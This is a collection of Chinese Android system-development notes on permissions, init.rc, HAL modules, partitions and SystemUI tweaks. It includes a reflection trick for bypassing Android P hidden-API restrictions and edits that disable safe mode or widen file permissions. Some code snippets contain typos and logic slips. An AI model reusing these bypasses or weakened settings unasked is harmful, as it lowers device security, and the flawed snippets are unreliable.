系统安装程序时会在图形界面中提示权限
2) 如果是缺少某个权限(程序中使用的某种权限而在 AndroidManifest.xml 中并未声
名),程序运行时会在 logcat 中打印出错误信息 requires <permission>
3) 与某个进程使用相同的用户 ID
应用程序可与系统中已存在的用户使用同一权限,需要在 AndroidManifest.xml 中
设置 sharedUserId,如 android:sharedUserId="android.uid.shared",作用是获得系统
权限,但是这样的程序属性只能在 build 整个系统时放进去(就是系统软件)才起
作用,共享 ID 的程序必须是同一签名的
3. Android 权限的实现
1) 第一层:由应用设置,修改 AndroidManifest.xml,形如:
<uses-permission android:name=”android.permission.INTERNET”/>
2) 第二层:框架层,权限对应组,frameworks/base/data/etc/platform.xml,形如:
<permission name=”android.permission.INTERNET”>
<group gid=inet” />
</permission>
3) 第三层:系统层,系统的权限,system/core/include/private/android_filesystem_config.h,形如:
#define AID_INET 3003
建立 SOCKET 的权限
......
{ “inet”, AID_INET, },
4. 系统权限
1) 特殊权限的用户
a) system
uid 1000
b) radio uid 1001
2) 查看可用系统的权限
$ adb shell
# pm list permissions
5. framework 层对权限的判断
1) 相关源码实现
frameworks/base/services/java/com/android/server/PackageManagerService.java
frameworks/base/services/java/com/android/server/am/ActivityManagerService.java
2) 在系统层,如何查看某个应用的权限
a) 在应用进程开启时,ActivityManagerService.java 会在 logcat 中输出该应用的权
限,形如:
I/ActivityManager(1730):
Start
proc
com.anbdroid.phone
for
restart
com.android.phone:pid=2605 uid=1000 gids={3002,3001,3003}
即它有 3001,3002,3003 三个权限:访问蓝牙和建立 socket
b) 注意:此打印输出在应用第一次启动时。如果进程已存在,需要先把对应进程
杀掉,以保证该进程重新启动,才能显示
c) 具体实现,见:
framewors/base/services/java/com/android/server/am/ActivityManagerService.java
的函数 startProcessLocked(),其中取其组信息的具本语句是
mContext.getPackageManager().getPackageGids(app.info.packageName);
6. 参考
http://wenku.baidu.com/view/7754a4360b4c2e3f5727634e.html
```

## 适配硬件平台

```text
1. 相关硬件
电池,RTC,键值(普通键值,DOCKING 键值),LED 灯,背光,传感器(亮度,距离,速度,指南针等),振动,蓝牙,相机,音视频引擎,网络,显示,电话
2. 硬件相关的主要目录
kernel,vendor,device,hardware,bootable
3. 以 HTC G1 为例分析其主要的平台配置目录 device/htc/dream/* (froyo 源码)
1) 注意:froyo 以前版本在 vendor/htc 中,需要单独下载,现在都已经在 git 里包含了 g1,g2 的支持。
2) 说明 (参见 g1,g2)
a) AndroidProducts.mk
说明产品都需要编什么东西,定义产品使用哪个 mk 文件
b) vendorsetup.sh
加上某硬件的支持,以便编译前用 lunch 选择
c) full_dream.mk
定义产品所要编译的项目,指定需要编译哪些应用,产品名称,设备,型号(重要)
d) BoardConfig.mk
含 mtd 设备的分区,硬件相关的模块,及编译工具
e) AndroidBoard.mk
编译 kernel, bootload, nandwrite, 键值定义文件, 开机画面的说明,重要的是
kernel 的默认配置文件 KERNEL_DEFCONFIG
f) device_*.mk
相关具体硬件(美国版的 G1)
g) overlay
格式类似源码根目录,存在定制产生用到的资源
h) *.kl, *.kcm
键值定义
i) *.sh
辅助工具的脚本,如从 update.zip 中提取库
4. 编译某平台相关代码
1) G1/G2
a) 下载并编译 kernel
b) 从手机或 update.zip 中提取 so 库
c) 编译,烧写
2) 其它机型
a) 下载并编译 kernel
b) 按 froyo 新规则添加硬件相关目录结构(vender=>device),修改 mk 文件
c) 从手机或 update.zip 中提取 so 库
d) 编译,烧写
5. 技巧
1) 可以逐步替换 boot.img,system.img 以定位问题
2) 逐个对比新旧 system 目录,以确认问题
3) 先让 adb shell 可用,以便调试
a) 重要的包
i) boot.img:含 kernel 和基本的文件系统
理论上说,只有 boot.img 而没有 system.img 也是可以启动并连接 adb 调试的,因为 adbd 在 boot.img 所含的基本文件系统中,但是需要重新定义 init.rc
ii) system.img:含主要系统,命令,库,图形界面
iii) userdata.img:放用户数据
b) 启动顺序为 bootloader->kernel->system->launcher
```

## Flash分区

```text
1. 查看当前系统的分区情况
$ adb shell
$ cat /proc/mtd
2. 分区对应的 img(源码编译后生成在 out/target/product/xxx/目录下)
1) modem(多个,支持电话和 GPS)
amss.mbn
2) bootloader(启动用)
appsboot.mbn
3) 空中升级
fota*(升级用, 可能多个)
4) 内核和文件系统
boot.img(内核和基本文件系统)
5) 系统分区
system.img(系统分区)
6) 用户数据分区
userdata.img(数据分区)
3. 参考
1) bootloader 启动顺序
http://blog.csdn.net/yili_xie/archive/2010/05/14/5592276.aspx
```

## [反射] android p 上使用 hiden 的方法

```text
方法1：
private void testJavaPojie() {
    try {
        Class reflectionHelperClz = Class.forName("com.example.support_p.ReflectionHelper");
        Class classClz = Class.class;
        Field classLoaderField = classClz.getDeclaredField("classLoader");
        classLoaderField.setAccessible(true);
        classLoaderFIeld.set(reflectionHelperClz, null);
    } catch(Exception e) {
        e.printStackTrace();
    }
}

方法2：
第二种方法，「借助系统的类去反射」也就是说，如果系统有一个方法`systemMethod`，这个`systemMethod` 去调用反射相反的方法，那么`systemMethod`毋庸置疑会反射成功。但是，我们从哪去找到这么一个方法给我们用?事实上，我们不仅能找到这样的方法，而且这个方法能帮助我们调用任意的函数，那就是**反射本身！**
Method metaGetDeclaredMethod = Class.class.getDeclaredMethod("getDeclardMethod"); // 公开API，无问题
Method hiddenMethod = metaGetDeclaredMethod.invoke(hiddenClass, "hiddenMethod", "hiddenMethod参数列表"); // 系统类通过反射使用隐藏 API，检查直接通过。
hiddenMethod.invoke // 正确找到 Method 直接反射调用
```

## [CMD] android 查看so的依赖关系

```text
/data/android-ndk/toolchains/arm-linux-androideabi-4.8/prebuilt/linux-x86_64/arm-linux-androideabi/bin/objdump -x ../bin/system_server | grep NEEDED
```

## [init] android启动过程配置文件的解析与语法

```text
(1)android启动文件系统后调用的第一个应用程序是/init，此文件的很重要的内容是解析了init.rc和init.xxx.rc
两个配置文件，然后执行解析出来的任务。相关代码在android源代码/system/core/init/init.c文件中，如下：
    parse_config_file("/init.rc");

    /* pull the kernel commandline and ramdisk properties file in */
    qemu_init();
    import_kernel_cmdline(0);

    get_hardware_name();
    snprintf(tmp, sizeof(tmp), "/init.%s.rc", hardware);
    parse_config_file(tmp);

(2)从上面代码可以看到，第一个配置文件名称固定为init.rc,而第二个配置文件格式为init.xxx.rc，其中xxx部分的内容
是从内核读取的，具体是读取文件/proc/cpuinfo中的Hardware部分，然后截取其部分内容。Hardware部分是定义在内核的
主板定义文件中，我的平台是定义在内核arch/arm/mach-mmp/merlin.c中，我的平台定义如下：
MACHINE_START(ARDENT_MERLIN, "PXA168-based Merlin Platform")
    .phys_io = APB_PHYS_BASE,
    .boot_params = 0x00000100,
    .io_pg_offst = (APB_VIRT_BASE >> 18) & 0xfffc,
    .map_io = pxa_map_io,
    .init_irq = pxa168_init_irq,
    .timer = &pxa168_timer,
    .init_machine = merlin_init,
MACHINE_END
这样截取到的hardware部分的内容就为pxa168-based，也就是说我的平台的第二个配置文件应该命名为init.pxa168-based.rc

(3)从上面看init.xxx.rc中的xxx内容是取决是内核中主板的定义的，如果觉得麻烦，可以将其在代码中写死，例如：
    parse_config_file(“init.merlin.rc”);

(4)配置文件的语法如下：
(a)配置文件的内容包含有4种：
     动作(Action)
     命令(Commands)
     服务(Services)
     选项(Options)
(b)动作和命令一起使用，形式如下：
on <trigger>
  <command>
  <command>
  <command>
其中trigger是触发条件，也就是说在满足触发条件的情况下执行1个或多个相应的命令，举例如下：
on property:persist.service.adb.enable=1
    start adbd

(c)服务和选项一起使用，形式如下：
  service <name> <pathname> [ <argument> ] *
  <option>
  <option>
  ...
上面内容解释为：
  service 服务名称 服务对应的命令的路径 命令的参数
    选项
    选项
  ...
举例如下：
service ril-daemon /system/bin/rild
    socket rild stream 660 root radio
    socket rild-debug stream 660 radio system
    user root
    group radio cache inet misc audio
上面的服务对应到/system/bin/rild命令，没有参数，服务名称为ril-daemon,后面的内容都是服务的选项。

(d)选项是影响服务启动和运行的参数，主要的选项如下：

disabled  禁用服务，此服务开机时不会自动启动，但是可以在应用程序中手动启动它。

socket <type> <name> <perm> [ <user> [ <group> ]  ] 
套接字    类型        名称           权限           用户           组
创建一个名为/dev/socket/<name>，然后把它的fd传给启动程序
类型type的值为dgram或者stream
perm表示该套接字的访问权限,user和group表示改套接字所属的用户和组，这两个参数默认都是0，因此可以不设置。

user <username>
执行服务前切换到用户<username>，此选项默认是root，因此可以不设置。

group <groupname> [ <groupname> ] *
执行服务前切换到组<groupname>,此选项默认是root,因此可以不设置

capability [ <capability> ] +
执行服务前设置linux capability，没什么用。

oneshot
服务只启动一次，一旦关闭就不能再启动。

class <name>
为服务指定一个类别，默认为"default"，同一类别的服务必须一起启动和停止

(e)动作触发条件<trigger>
boot  首个触发条件，初始化开始(载入配置文件)的时候触发

<name>=<value>
当名为<name>的属性(property)的值为<value>的时候触发

device-added-<path>
路径为<path>的设置添加的时候触发

device-removed-<path>
路径为<path>的设置移除的时候触发

service-exited-<name>
名为<name>的服务关闭的时候触发

(f)命令(Command)的形式
exec <path> [ <argument> ] *
复制(fork)和执行路径为<path>的应用程序，<argument>为该应用程序的参数，在该应用程序执行完前，此命令会屏蔽，

export <name> <value>
声明名为<name>的环境变量的值为<value>，声明的环境变量是系统环境变量，启动后一直有效。

ifup <interface>
启动名为<interface>的网络接口

import <filename>
加入新的位置文件，扩展当前的配置。

hostname <name>
设置主机名

class_start <serviceclass>
启动指定类别的所有服务

class_stop <serviceclass>
停止指定类别的所有服务

domainname <name>
设置域名

insmod <path>
加载路径为<path>的内核模块

mkdir <path>
创建路径为<path>目录

mount <type> <device> <dir> [ <mountoption> ] *
挂载类型为<type>的设备<device>到目录<dir>,<mountoption>为挂载参数，距离如下：
    mount ubifs ubi1_0 /data nosuid nodev

setkey
暂时未定义

setprop <name> <value>
设置名为<name>的系统属性的值为<value>

setrlimit <resource> <cur> <max>
设置资源限制，举例：
# set RLIMIT_NICE to allow priorities from 19 to -20
    setrlimit 13 40 40
没看懂是什么意思。

start <service>
启动服务(如果服务未运行)

stop <service>
停止服务(如果服务正在运行)

symlink <target> <path>
创建一个从<path>指向<target>的符号链接，举例：
    symlink /system/etc /etc

write <path> <string> [ <string> ] *
打开路径为<path>的文件并将一个或多个字符串写入到该文件中。

(g)系统属性(Property)
android初始化过程中会修改一些属性，通过getprop命令我们可以看到属性值，这些属性指示了某些动作或者服务的状态，主要如下：
init.action      如果当前某个动作正在执行则init.action属性的值等于该动作的名称，否则为""
init.command     如果当前某个命令正在执行则init.command属性的值等于该命令的名称，否则为""
init.svc.<name>  此属性指示个名为<name>的服务的状态("stopped", "running", 或者 "restarting").


init.rc脚本的启动顺序
我们知道android在启动的时候通过init进程来解析init.rc和init.xxx.rc文件，
然后执行这两个文件解析出来的内容，init.rc和init.xxx.rc文件中的内容却并不是
按照顺序来执行的，而是有固定的执行顺序，首先，init.rc和init.xxx.rc文件中的内容
全部会放在4个关键字下：
early-init, init, early-boot, boot
所以一个典型的rc文件的写法如下：
on early-init
--------------

on init
--------------

on early-boot
--------------

on boot
--------------
rc文件中这4个部分是可以打乱顺序随便写的，甚至可以有多个部分出现，但是解析完了以后的执行
顺序确实固定的，执行顺序如下：
early-init -> init -> early-boot -> boot
```

## 背光灯模块

```text
android系统开发(七)-背光模块
1,总论
背光模块属于HAL层开发，HAL层开发，用一句话来概括就是定义一个hardware.h中定义的名称为宏HAL_MODULE_INFO_SYM的hw_module_t结构体，
然后实现结构体的相关内容

2,驱动方面的准备
简单的嵌入式linux驱动，编写LCD背光驱动，并提供接口给上层修改，我所用的是直接修改接口文件，接口如下：
/sys/class/backlight/pwm-backlight/brightness  这个是亮度调节
/sys/class/backlight/pwm-backlight/max_brightness 这个是最大亮度，按照android系统的要求应该设置成255
控制亮度直接写brightness文件即可
背光驱动主要是通过PWM来完成，这里不详细说明。

3,需要包含的头文件
/hardware/libhardware/include/hardware目录下的hardware.h和lights.h
其中hardware.h中定义了通用硬件模块，lights.h中定义了背光设备相关的内容

4,android已有的硬件模块在/hardware/libhardware/modules目录下，为了区分，我们开发的背光模块放置在如下的目录：
vendor/ardent/merlin/lights目录下，编译成lights.default.so放置到/system/lib/hw目录下，模块命名规则可以
参考上一节的内容。

5,修改vendor/ardent/merlin目录下AndroidBoard.mk文件，添加如下内容：
include $(LOCAL_PATH)/lights/Mdroid.mk

6,lights目录新建Mdroid.mk文件，内容如下：
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)

LOCAL_MODULE_PATH := $(TARGET_OUT_SHARED_LIBRARIES)/hw
LOCAL_SRC_FILES:= lights.c

LOCAL_SHARED_LIBRARIES := \
    libutils \
    libcutils \
    libhardware

LOCAL_PRELINK_MODULE := false

LOCAL_MODULE := lights.default

include $(BUILD_SHARED_LIBRARY)

7,lights目录下新建一个lights.c文件，如下：
const struct hw_module_t HAL_MODULE_INFO_SYM = {
    .tag = HARDWARE_MODULE_TAG,
    .version_major = 1,
    .version_minor = 0,
    .id = LIGHTS_HARDWARE_MODULE_ID,
    .name = "lights module",
    .author = "allen",
    .methods = NULL,
};

8，上面的内容可以直接编译通过，但是因为我将其methods部分指向了空指针，因此没有任何功能，下面来实现此部分
hw_module_t机构体的methods成员是一个指向hw_module_methods_t结构体的一个指针，hw_module_methods_t结构体定义如下：
typedef struct hw_module_methods_t {
    int (*open)(const struct hw_module_t* module, const char* id,struct hw_device_t** device);
} hw_module_methods_t;
据此我们定义一个hw_module_methods_t类型的参数lights_module_methods如下：
struct hw_module_methods_t lights_module_methods = {
    .open = lights_device_open
};
然后将上面的methods由NULL改成lights_module_methods

9,接下来就是定义lights_device_open函数了，此函数的参数和返回值由hw_module_methods_t结构体的open成员决定，此函数定义如下：
static int lights_device_open(const struct hw_module_t *module,const char *id, struct hw_device_t **device)
从lights_device_open函数的参数来看，第一个参数和第二个参数是常量，第三个参数是 一个指向hw_device_t结构体的指针，因此可以断定
实现此函数也就是要完成第三个参数的内容，详细的内容我们可以参考直接调用该函数的内容，在frameworks/base/services/jni目录下的
com_android_server_LightsService.cpp文件中，内容如下：
static light_device_t* get_device(hw_module_t* module, char const* name)
{
    int err;
    hw_device_t* device;
    err = module->methods->open(module, name, &device);
    if (err == 0) {
        return (light_device_t*)device;//device由hw_device_t指针强制转换成light_device_t指针
    } else {
        return NULL;
    }
}

static jint init_native(JNIEnv *env, jobject clazz)
{
    int err;
    hw_module_t* module;
    Devices* devices;
    
    devices = (Devices*)malloc(sizeof(Devices));

    err = hw_get_module(LIGHTS_HARDWARE_MODULE_ID, (hw_module_t const**)&module);
    if (err == 0) {
        devices->lights[LIGHT_INDEX_BACKLIGHT] 
                = get_device(module, LIGHT_ID_BACKLIGHT);
        devices->lights[LIGHT_INDEX_KEYBOARD] 
                = get_device(module, LIGHT_ID_KEYBOARD);
        devices->lights[LIGHT_INDEX_BUTTONS] 
                = get_device(module, LIGHT_ID_BUTTONS);
        devices->lights[LIGHT_INDEX_BATTERY] 
                = get_device(module, LIGHT_ID_BATTERY);
        devices->lights[LIGHT_INDEX_NOTIFICATIONS] 
                = get_device(module, LIGHT_ID_NOTIFICATIONS);
        devices->lights[LIGHT_INDEX_ATTENTION] 
                = get_device(module, LIGHT_ID_ATTENTION);
        devices->lights[LIGHT_INDEX_BLUETOOTH] 
                = get_device(module, LIGHT_ID_BLUETOOTH);
        devices->lights[LIGHT_INDEX_WIFI] 
                = get_device(module, LIGHT_ID_WIFI);
    } else {
        memset(devices, 0, sizeof(Devices));
    }

    return (jint)devices;
}
从上面的内容我们可以看出lights_device_open的第一个参数是JNI层用hw_get_module所获得，第二个参数根据设备的不同有很多种情况
该参数的内容定义在lights.h中，全部情况如下：
#define LIGHT_ID_BACKLIGHT          "backlight"
#define LIGHT_ID_KEYBOARD           "keyboard"
#define LIGHT_ID_BUTTONS            "buttons"
#define LIGHT_ID_BATTERY            "battery"
#define LIGHT_ID_NOTIFICATIONS      "notifications"
#define LIGHT_ID_ATTENTION          "attention"
#define LIGHT_ID_BLUETOOTH          "bluetooth"
#define LIGHT_ID_WIFI               "wifi"
lights调节有背光，键盘，按键，电池，通知，提醒，蓝牙和WIF
第三个参数是一个指向一个hw_device_t的指针，但是com_android_server_LightsService.cpp文件中的背光调节函数定义如下：
static void setLight_native(JNIEnv *env, jobject clazz, int ptr, int light, int colorARGB, int flashMode, int onMS, int offMS, int brightnessMode) {
    Devices* devices = (Devices*)ptr;
    light_state_t state;

    if (light < 0 || light >= LIGHT_COUNT || devices->lights[light]  == NULL) {
        return ;
    }

    memset(&state, 0, sizeof(light_state_t));
    state.color = colorARGB;
    state.flashMode = flashMode;
    state.flashOnMS = onMS;
    state.flashOffMS = offMS;
    state.brightnessMode = brightnessMode;

    devices->lights[light] ->set_light(devices->lights[light] , &state);
}
get_device函数中将hw_device_t指针强制转换成light_device_t指针给调节背光用，而light_device_t定义如下：
struct light_device_t {
    struct hw_device_t common;
    int (*set_light)(struct light_device_t* dev,
            struct light_state_t const* state);
};
因此在实现lights_device_open的第三个参数的时候，我们应该定义一个light_device_t类型结构体，然后
将起common域的指针地址传递过去。这样虽然传递的是一个hw_device_t指针地址，但是JNI层可以将其强制转换
成light_device_t指针地址用，否则devices->lights[light] ->set_light就会起不到作用了。实现如下：
static int lights_device_open(const struct hw_module_t *module,const char *id, struct hw_device_t **device)
{
    struct light_device_t *dev = NULL;
    int resvalue = -1;
    dev = calloc(sizeof(struct light_device_t),1);
    dev->common.tag = HARDWARE_DEVICE_TAG;
    dev->common.version = 0;
    dev->common.module = (struct hw_module_t *)module;
    dev->common.close = lights_device_close;
    if(!strcmp(id, LIGHT_ID_BACKLIGHT))
    {
        dev->set_light = lcd_set_light;
        resvalue = 0;
    }
    else
    {
        dev->set_light = other_set_light;
        resvalue = 0;
    }
    *device = &dev->common;
    return resvalue;
}

10，实现lights_device_close，lcd_set_light和other_set_light，这个主要是调用驱动提供的接口直接控制硬件，举例如下：
static int lights_device_close(struct hw_device_t* device)
{
    struct light_device_t *m_device = (struct light_device_t *)device;
    if(m_device)
        free(m_device);
    return 0;
}
static int lcd_set_light(struct light_device_t* dev,struct light_state_t const* state)
{
    int fd = -1;
    int bytes = 0;
    int rlt = -1;
    unsigned char brightness = ((77*((state->color>>16)&0x00ff))
                               + (150*((state->color>>8)&0x00ff)) 
                               + (29*(state->color&0x00ff))) >> 8;
    fd = open("/sys/class/backlight/pwm-backlight/brightness", O_RDWR);
    if(fd>0)
    {
        char buffer[20] ;
     memset(buffer, 0, 20);
    bytes = sprintf(buffer, "%d", brightness);
    rlt = write(fd, buffer, bytes);
        if(rlt>0)
        {
           close(fd);
           return 0;
        }
    }
    close(fd);
    return -1;
}

static int other_set_light(struct light_device_t* dev,struct light_state_t const* state)
{
    return 0;
}

11，因为上面调节背光是通过写/sys/class/backlight/pwm-backlight/brightness文件来完成，因此一定要设置该文件的权限，
在init.xxx.rc文件中添加如下的内容：
    # for control LCD backlight
    chown system system /sys/class/backlight/pwm-backlight/brightness
    chmod 0666 /sys/class/backlight/pwm-backlight/brightness

12，修改完成后经验证亮度调节可用，上面的例子只是实现了lights部分功能，如果需要完成所有的功能，请参考hardware.h, lights.h和com_android_server_LightsService.cpp文件中的内容。

本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/jiajie961/archive/2010/11/23/6030405.aspx
```

## [sdcard] android系统开发(八)-SDCARD

```text
关于android系统开发sdcard移植，主要有如下工作：
1，内核驱动开发，完成后每次插入和拔出sdcard系统都会有相关的信息显示，而且sdcard可以手动挂载。

2，android的sdcard挂载主要是vold来完成，vold的源代码在/system/vold目录下，编译成/system/bin/vold
init.rc文件中有vold系统服务，确保android系统开机后vold有正常运行。

3，添加vold的配置文件，先查看/system/bin/vold/main.cpp文件中的process_config函数，发现配置文件路径如下：
/etc/vold.fstab
android2.2下/etc目录指向了/system/etc目录，因此我们要新建一个vold.fstab文件，目标路径为/system/etc/vold.fstab

4，vold.fstab文件的写法，参考/system/core/rootdir/etc目录下的vold.fstab,里面有详细的说明和例子，写法如下：
dev_mount       <label>     <mount_point>     <part>       <sysfs_path1...>
dev_mount命令        标签                挂载点                            子分区               设备在sysfs文件系统下的路径(可多个)
按照上面的要求和我的平台的实际情况，在vold.fstab中添加如下内容：
dev_mount sdcard /mnt/sdcard auto         /block/mmcblk0
上面的/block/mmcblk0表示sysfs下的路径，由于linux的sysfs文件系统是在sys目录下，所以对应到/sys/block/mmcblk0目录

5，完成后发现android系统中sdcard可用了，总结下载，sdcard部分很简单，主要是找到sdcard设备对应的sysfs文件系统路径

本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/jiajie961/archive/2010/11/25/6035369.aspx
```

## [字体] Android系统增加字体库及修改系统默认字体

```text
https://blog.csdn.net/hsaekong/article/details/80305263

一、Android系统增加字体库

1.把字体cordiau.ttf文件copy到frameworks\base\data\fonts目录
2.修改frameworks\base\data\fonts\Android.mk文件,如下图:
3.修改frameworks\base\data\fonts\fonts.mk文件,如下图
4.在frameworks/base/data/fonts目录下单编,执行mm
5.编译成功后,把文件push到system/fonts

二、修改系统默认字体
1、修改frameworks/base/data/fonts/system_fonts.xml文件，如下图：

然后push到system/etc，重启后，系统默认字体替换为cordiau.ttf了
```

## [snippet] Android 通过代码区分高通/MTK/展锐平台

```text
public static boolean isHardWareVendorQualcomm() {
    String hardware = android.os.Build.HARDWARE;
    if (hardware.matches("qcom")) {
        Log.d(TAG, "Qualcomm platform");
        return true;
    }
    return false;
}

public static boolean isHardWareVendorMediaTek() {
    String hardware = android.os.Build.HARDWARE;
    if (hardware.matches("mt[0-9] *")) {
        Log.d(TAG, "MediaTek platform");
        return true;
    }
    return false;
}

public static boolean isHardWareVendorSprd() {
    String hardware = android.os.Build.HARDWARE;
    if (hardware.matches("sp[0-9] *")) {
        Log.d(TAG, "MediaTek platform");
        return true;
    }
    return false;
}
```

## [boot] 安卓bootloader：三分钟让你彻底理解uboot的启动与功能

```text
https://blog.csdn.net/kai_zone/article/details/80443820

1. Bootloader简介
系统上电后，需要一段程序来进行初始化：关闭看门狗，改变系统时钟，初始化存储控制器，将更多的代码复制到内存中等。它就是bootloader。

bootloader的实现非常依赖具体硬件，在嵌入式系统中，硬件配置千差万别，即使是相同的CPU，它的外设（比如flash）也可能不同，所以不可能有一个bootloader支持所有的CPU,所有的电路板。即使是支持CPU架构比较多的UBoot，也不是一拿来就可以使用（除非里面的配置刚好和你的板子相同）。需要进行一些配置。

CPU上电后，会从某个地址开始执行，比如MIPS结构的CPU会从0xBFC00000取第一条指令，而ARM结构的CPU则会从0x00000000开始，嵌入式开发板中，需要把存储器件的ROM或Flash等映射到这个地址，Bootloader就存放在这个地址的开始处，一上电就开始执行。（手机中的RAM和ROM分别对应电脑的内存和硬盘）

2. 启动流程。
u-boot系统启动流程 大多数bootloader都分为stage1和stage2两部分，u-boot也不例外。

依赖于CPU体系结构的代码（如设备初始化代码等）通常都放在stage1且可以用汇编语言来实现，而stage2则通常用C语言来实现，这样可以实现复杂的功能，而且有更好的可读性和移植性。

1.Stage1 start.S代码结构 u-boot的stage1代码通常放在start.S文件中，他用汇编语言写成，其主要代码部分如下

（1）定义入口。： 该工作通过修改连接器脚本来完成。
（2）设置异常向量（Exception Vector）。 
（3）设置CPU的速度、时钟频率及终端控制寄存器。 
（4）初始化内存控制器。 
（5）将ROM中的程序复制到RAM中。 
（6）关中断，关看门狗
（7）初始化堆栈，清bss段，为第二阶段准备。
（8）转到RAM中执行，该工作可使用指令ldr pc来完成。
```

## [boot] 制作修改开机logo

```text
修改开机logo有两种方法，一种直接去改c语言代码，第二种替换图片用python生成splash。第一种方法我没试过，感觉挺麻烦的，还有分辨率限制，超过多少分辨率就不能用第一种方法。

修改的文件路径LINUX/android/bootable/bootloader/lk/splash
准备好logo图片(png、bmp格式)
查看中原图片的分辨率，修改logo图片 保证 分辨率 一致
生成splash.img镜像文件
注：图片分辨率很重要！很重要！很重要！

生成splash.img 步骤

The steps to generate a splash.img:
 
sudo apt-get install python-imaging
python ./logo_gen.py boot_001.png (*.bmp)

为了减少编译时间可以直接将生成好的splash.img将刷机包中的文件替换掉。
```

## [sysui] Android--隐藏状态栏图标

```text
目前状态栏图标有通知图标和系统图标
通知图标主要是指各应用发过来的通知，比如未接电话，截图，后台播放音乐等，系统图标主要有蓝牙，耳机，wifi，数据流量，时间和电池...

1，不显示通知图标，
在/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarIconController.java中
public void updateNotificationIcons {

     for (int i = 0; i < N; i++) {
            NotificationData.Entry ent = activeNotifications.get(i);
  +          final String pkg = ent.notification.getPackageName();
  +           android.util.Log.d("StatusBarIconController","pkg========"+pkg);

            //比如如果包名不是收音机的，就不显示图标
  +        if (!pkg.contains("com.android.fmradio")) {
  +              continue;
            }
            if (notificationData.isAmbient(ent.key)
                    && !NotificationData.showNotificationEvenIfUnprovisioned(ent.notification)) {
                continue;
            }
}

2.不显示系统图标，系统图标的显示是在以下文件，比如蓝牙，wifi，耳机等
/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/
PhoneStatusBarPolicy.java

将不要显示图标，将setIconVisibility()改为false即可，比如，如果不要闹钟图标
private void updateAlarm() {
        ....
- - -       mService.setIconVisibility(SLOT_ALARM_CLOCK, mCurrentUserSetup && hasAlarm);

+++ mService.setIconVisibility(SLOT_ALARM_CLOCK, false);
    }
3,系统图标中比较特殊的时间和电池在
/frameworks/base/packages/SystemUI/res/layout/status_bar.xml
<com.android.systemui.statusbar.policy.Clock
                android:id="@+id/clock"
                android:textAppearance="@style/TextAppearance.StatusBar.Clock"
                android:layout_width="wrap_content"
                android:layout_height="match_parent"
                android:singleLine="true"
                android:paddingStart="7dp"
                android:gravity="center_vertical|start"
+++            android:visibility="gone"   //时间
                />
/frameworks/base/packages/SystemUI/res/layout/system_icons.xml

<com.android.systemui.BatteryMeterView android:id="@+id/battery"
        android:layout_height="14.5dp"
        android:layout_width="9.5dp"
+++    android:visibility="gone"      电池
        android:layout_marginBottom="@dimen/battery_margin_bottom"/>
```

## Android关掉系统的安全模式(Safe mode)

```text
当 Android 设备在安全模式（Safe Mode）下工作时，任何的第三方应用程序或相关文件（主要为apk应用程序文件）都不可以使用，但可以使用 Android 设备的任务管理器选项进行卸载或管理应用程序，即Android 设备的操作系统或软件或相关文件出现问题导致系统进不了正常界面或不能正常启动系统时，则可以将设备进入安全模式（Safe Mode）卸载或管理原系统以外安装的应用程序或驱动文件或其他第三方相关文件，当在安全模式（Safe Mode）下完全卸载或管理了相关第三方安装的应用程序仍然不可以解决问题后，再进行安装或升级或更新操作系统或其他方法来解决问题。进入安全模式时，主界面的左下方显示“安全模式”或“Safe Mode”提示。安全模式进入方法：机器启动后，在开机动画前， 按住 Menu 或 音量减键至开机完成，就可以进入安全模式。安全模式退出方法：若需要退出安全模式，当且Android 设备在没有进行过特别使用或使用不当时（设备未使用非原装充电器充电，设备未拆过机等），将设备关机，然后重新开机，即可以退出安全模式，正常进入系统.系统检测是否进入安全模式的调用实现列出：
frameworks/base/services/java/com/android/server/SystemServer.java
frameworks/base/services/java/com/android/server/wm/WindowManagerService.java
frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java

+++ frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java
@@ -7532,7 +7532,7 @@ public class WindowManagerService extends IWindowManager.Stub
             Log.i(TAG, "SAFE MODE not enabled");
         }
         mPolicy.setSafeMode(mSafeMode);
-        return mSafeMode;
+        return false;
     }
 
     public void displayReady() {
```

## 消除原生Android网络状态上的惊叹号

```text
谷歌在Android5.0之后的版本加入了CaptivePotalLogin服务。本服务的功能是检查网络连接互联网情况，主要针对于Wi-Fi，不让Android设备自动连接那些不能联网的无线热点，白白耗电。
该服务的原理就是让接入无线热点后，测一下网站connectivitycheck.gstatic.com的联通情况。
但对于不能访问谷歌服务器的地区，问题就来了：

如果谷歌（谷歌服务）认为WiFi网络无法联网，就不会自动连接到该WiFi热点。而且如果设备有移动网络可用，就会自动切换到2G/3G/LTE。并且让WiFi网络的标志上面显示感叹号标志。

出现感叹号的同时，该服务会一直试探服务器，直到联通为止。该过程会消耗流量和电量，甚至导致部分设备无法休眠。

这个感叹号会使广大强迫症晚期患者无法接受。

对于Android Source开发的同学，最好的解决办法自然是修改源码：
方案1：更换测试地址
frameworks/base/packages/SettingsProvider/res/values/defaults.xml：

diff --git a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
index bede17d..508d384 100644
--- a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
+++ b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml
@@ -215,5 +215,5 @@
     <bool name="def_guest_user_enabled">true</bool>
 
     <!-- Default for Settings.Global.CAPTIVE_PORTAL_DETECTION_ENABLED -->
-    <integer name="def_captive_portal_detection_enabled" translatable="false">1</integer>
+    <integer name="def_captive_portal_detection_enabled" translatable="false">0</integer>
 </resources>
```

## Android系统修改所有应用能读写SD卡

```text
需要Android源码frameworks/base/data/etc/platform.xml
找到
<permission name="android.permission.WRITE_EXTERNAL_STORAGE">
<group gid="sdcard_rw" />

修改为
<permission name="android.permission.WRITE_EXTERNAL_STORAGE">
<group gid="sdcard_rw" />
<group gid="media_rw" />

保存，将系统烧录到板中即可。 
```

## [Snippet] 修改开机弹出欢迎使用SIM

```text
MTK工程 mediatek/packages/apps/Stk1/src/com/android/stk/StkAppService.java
frameworks\base\packages\Keyguard\src\com\mediatek\keyguard\Telephony\KeyguardDialogManager.java
    case DISPLAY_TEXT:
        //显示SIM卡信息
        launchTextDialog(slotId);
        break;
```

## [Snippet] 关闭通知栏通能

``frameworks\base\core\java\android\app\NotificationManager.java``

```text
